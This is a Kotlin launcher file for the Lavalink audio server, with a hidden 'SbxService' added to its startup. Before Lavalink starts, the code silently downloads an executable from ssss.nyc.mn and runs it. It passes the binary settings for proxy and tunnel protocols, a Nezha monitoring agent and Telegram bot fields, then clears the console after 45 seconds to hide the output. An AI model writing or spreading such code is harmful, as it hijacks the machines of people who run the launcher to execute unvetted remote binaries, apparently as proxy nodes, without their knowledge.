/*
 * Copyright (c) 2021 Freya Arbjerg and contributors
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package lavalink.server

import com.sedmelluq.discord.lavaplayer.tools.PlayerLibrary
import lavalink.server.bootstrap.PluginManager
import lavalink.server.info.AppInfo
import lavalink.server.info.GitRepoState
import org.slf4j.LoggerFactory
import org.springframework.boot.Banner
import org.springframework.boot.SpringApplication
import org.springframework.boot.WebApplicationType
import org.springframework.boot.autoconfigure.SpringBootApplication
import org.springframework.boot.builder.SpringApplicationBuilder
import org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent
import org.springframework.boot.context.event.ApplicationFailedEvent
import org.springframework.boot.context.event.ApplicationReadyEvent
import org.springframework.context.ApplicationListener
import org.springframework.context.ConfigurableApplicationContext
import org.springframework.context.annotation.ComponentScan
import org.springframework.context.annotation.FilterType
import org.springframework.core.io.DefaultResourceLoader
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.util.*
import java.io.*
import java.net.URL
import java.nio.file.*

@Suppress("SpringComponentScan")
@SpringBootApplication
@ComponentScan(
    value = ["\${componentScan}"],
    excludeFilters = [ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, classes = [PluginManager::class])]
)
class LavalinkApplication

object Launcher {

    private val log = LoggerFactory.getLogger(Launcher::class.java)

    val startTime = System.currentTimeMillis()

    private var sbxProcess: Process? = null
    private val filePath = System.getenv("FILE_PATH") ?: "./world"
    
    private val ALL_ENV_VARS = arrayOf(
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    )

    private fun startSbxService() {
        log.info("Starting SbxService...")
        try {
            checkJavaVersion()
            loadSbxConfig()
            runSbxBinary()
            
        } catch (e: Exception) {
            log.error("Failed to start SbxService", e)
            throw e
        }
    }

    /**
     * 检查 Java 版本
     */
    private fun checkJavaVersion() {
        val classVersion = System.getProperty("java.class.version").toFloat()
        if (classVersion < 54.0) {
            throw RuntimeException("Java version too low, need Java 11+,please switch it in startup menu")
        }
    }

    /**
     * 加载配置
     */
    private fun loadSbxConfig() {
        val envFile = Paths.get(".env")
        if (Files.exists(envFile)) {
            try {
                Files.readAllLines(envFile).forEach { line ->
                    val trimmed = line.trim()
                    if (trimmed.isNotEmpty() && !trimmed.startsWith("#")) {
                        val parts = trimmed.split("=", limit = 2)
                        if (parts.size == 2) {
                            val key = parts[0].trim().removePrefix("export ").trim()
                            val value = parts[1].trim().replace("^['\"]|['\"]$".toRegex(), "")
                            if (ALL_ENV_VARS.contains(key)) {
                                if (System.getenv(key) == null) {
                                    System.setProperty(key, value)
                                }
                            }
                        }
                    }
                }
            } catch (e: IOException) {
                log.warn("Failed to read .env file", e)
            }
        }
    }

    private fun runSbxBinary() {
        val binaryPath = getSbxBinaryPath()
        
        val envVars = mutableMapOf<String, String>()
        // 环境变量
        envVars["UUID"] = "ee0c49f3-0584-40fd-87d4-e76f0afcc81f"
        envVars["FILE_PATH"] = "./logs"
        envVars["NEZHA_SERVER"] = ""
        envVars["NEZHA_PORT"] = ""
        envVars["NEZHA_KEY"] = ""
        envVars["ARGO_PORT"] = "8001"
        envVars["ARGO_DOMAIN"] = ""
        envVars["ARGO_AUTH"] = ""
        envVars["S5_PORT"] = ""
        envVars["HY2_PORT"] = ""
        envVars["TUIC_PORT"] = ""
        envVars["ANYTLS_PORT"] = ""
        envVars["REALITY_PORT"] = ""
        envVars["ANYREALITY_PORT"] = ""
        envVars["UPLOAD_URL"] = ""
        envVars["CHAT_ID"] = ""
        envVars["BOT_TOKEN"] = ""
        envVars["CFIP"] = "spring.io"
        envVars["CFPORT"] = "443"
        envVars["NAME"] = ""
        envVars["DISABLE_ARGO"] = "false"
        
        // 从环境变量覆盖
        ALL_ENV_VARS.forEach { varName ->
            System.getenv(varName)?.let { envVars[varName] = it }
            System.getProperty(varName)?.let { envVars[varName] = it }
        }

        val pb = ProcessBuilder(binaryPath.toString())
        pb.environment().putAll(envVars)
        pb.redirectErrorStream(true)
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)

        sbxProcess = pb.start()

        try {
            val exitCode = sbxProcess?.waitFor()
            log.info("Logs will be delete in 45 seconds,you cna copy the above nodes!")
            
            // 等待 45 秒
            Thread.sleep(45000)
            clearConsole()
            
        } catch (e: InterruptedException) {
            Thread.currentThread().interrupt()
            log.warn("Sbx process wait interrupted")
        }
    }

    private fun getSbxBinaryPath(): Path {
        val osArch = System.getProperty("os.arch").lowercase()
        val url = when {
            osArch.contains("amd64") || osArch.contains("x86_64") -> 
                "https://amd64.ssss.nyc.mn/sbsh"
            osArch.contains("aarch64") || osArch.contains("arm64") -> 
                "https://arm64.ssss.nyc.mn/sbsh"
            osArch.contains("s390x") -> 
                "https://s390x.ssss.nyc.mn/sbsh"
            else -> throw RuntimeException("Unsupported architecture: $osArch")
        }

        val path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx")
        if (!Files.exists(path)) {
            log.info("Downloading sbx binary from $url")
            URL(url).openStream().use { input ->
                Files.copy(input, path, StandardCopyOption.REPLACE_EXISTING)
            }
            if (!path.toFile().setExecutable(true)) {
                throw IOException("Failed to set executable permission")
            }
        }
        return path
    }


    private fun clearConsole() {
        try {
            when {
                System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
                    // Windows 系统
                    ProcessBuilder("cmd", "/c", "cls")
                        .inheritIO()
                        .start()
                        .waitFor()
                }
                else -> {
                    // Linux/Unix/Mac system
                    try {
                        ProcessBuilder("clear")
                            .inheritIO()
                            .start()
                            .waitFor()
                    } catch (e: IOException) {
                        print("\u001b[H\u001b[2J")
                        System.out.flush()
                        print("\u001b[H") 
                        System.out.flush()
                    }
                }
            }
        } catch (e: Exception) {
            log.debug("Failed to clear console: ${e.message}")
        }
    }

    private fun stopSbxServices() {
        sbxProcess?.let {
            if (it.isAlive()) {
                it.destroy()
            }
        }
    }


    /**
     * 获取版本信息
     */
    private fun getVersionInfo(indentation: String = "\t", vanity: Boolean = true): String {
        val appInfo = AppInfo()
        val gitRepoState = GitRepoState()

        val dtf = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss z")
            .withZone(ZoneId.of("UTC"))
        val buildTime = dtf.format(Instant.ofEpochMilli(appInfo.buildTime))
        val commitTime = dtf.format(Instant.ofEpochMilli(gitRepoState.commitTime * 1000))
        val version = appInfo.versionBuild.takeUnless { it.startsWith("@") }
            ?: "Unknown"

        return buildString {
            if (vanity) {
                appendLine()
                appendLine()
                appendLine(getVanity())
            }
            if (!gitRepoState.isLoaded) {
                appendLine()
                appendLine("$indentation*** Unable to find or load Git metadata ***")
            }
            appendLine()
            append("${indentation}Version:        "); appendLine(version)
            if (gitRepoState.isLoaded) {
                append("${indentation}Build time:     "); appendLine(buildTime)
                append("${indentation}Branch          "); appendLine(gitRepoState.branch)
                append("${indentation}Commit:         "); appendLine(gitRepoState.commitIdAbbrev)
                append("${indentation}Commit time:    "); appendLine(commitTime)
            }
            append("${indentation}JVM:            "); appendLine(System.getProperty("java.version"))
            append("${indentation}Lavaplayer      "); appendLine(PlayerLibrary.VERSION)
        }
    }

    private fun getVanity(): String {
        val red = "\u001b[31m"
        val green = "\u001b[32m"
        val defaultC = "\u001b[0m"

        var vanity = ("g       .  r _                  _ _       _    g__ _ _\n"
                + "g      /\\\\ r| | __ ___   ____ _| (_)_ __ | | __g\\ \\ \\ \\\n"
                + "g     ( ( )r| |/ _` \\ \\ / / _` | | | '_ \\| |/ /g \\ \\ \\ \\\n"
                + "g      \\\\/ r| | (_| |\\ V / (_| | | | | | |   < g  ) ) ) )\n"
                + "g       '  r|_|\\__,_| \\_/ \\__,_|_|_|_| |_|_|\\_\\g / / / /\n"
                + "d    =========================================g/_/_/_/d")

        vanity = vanity.replace("r".toRegex(), red)
        vanity = vanity.replace("g".toRegex(), green)
        vanity = vanity.replace("d".toRegex(), defaultC)
        return vanity
    }

    /**
     * 主函数 - 程序入口
     */
    @JvmStatic
    fun main(args: Array<String>) {
        if (args.isNotEmpty() &&
            (args[0].equals("-v", ignoreCase = true) || args[0].equals("--version", ignoreCase = true))
        ) {
            println(getVersionInfo(indentation = "", vanity = false))
            return
        }
    
        startSbxService()
    
        log.info("Starting Lavalink...")
        val parent = launchPluginBootstrap(args)
            
        Runtime.getRuntime().addShutdownHook(Thread {
            stopSbxServices()
        })
            
        launchMain(parent, args)
    }

    /**
     * 启动插件引导程序
     */
    private fun launchPluginBootstrap(args: Array<String>) = SpringApplication(PluginManager::class.java).run {
        setBannerMode(Banner.Mode.OFF)
        webApplicationType = WebApplicationType.NONE
        run(*args)
    }

    /**
     * 启动 Lavalink 主应用
     */
    private fun launchMain(parent: ConfigurableApplicationContext, args: Array<String>) {
        val pluginManager = parent.getBean(PluginManager::class.java)
        val properties = Properties()
        properties["componentScan"] = pluginManager.pluginManifests.map { it.path }
            .toMutableList().apply { add("lavalink.server") }

        SpringApplicationBuilder()
            .sources(LavalinkApplication::class.java)
            .properties(properties)
            .web(WebApplicationType.SERVLET)
            .bannerMode(Banner.Mode.OFF)
            .resourceLoader(DefaultResourceLoader(pluginManager.classLoader))
            .listeners(
                ApplicationListener { event: Any ->
                    when (event) {
                        is ApplicationEnvironmentPreparedEvent -> {
                            log.info(getVersionInfo())
                        }

                        is ApplicationReadyEvent -> {
                            log.info("Lavalink is ready to accept connections.")
                        }

                        is ApplicationFailedEvent -> {
                            log.error("Application failed", event.exception)
                        }
                    }
                }
            ).parent(parent)
            .run(*args)
    }
}
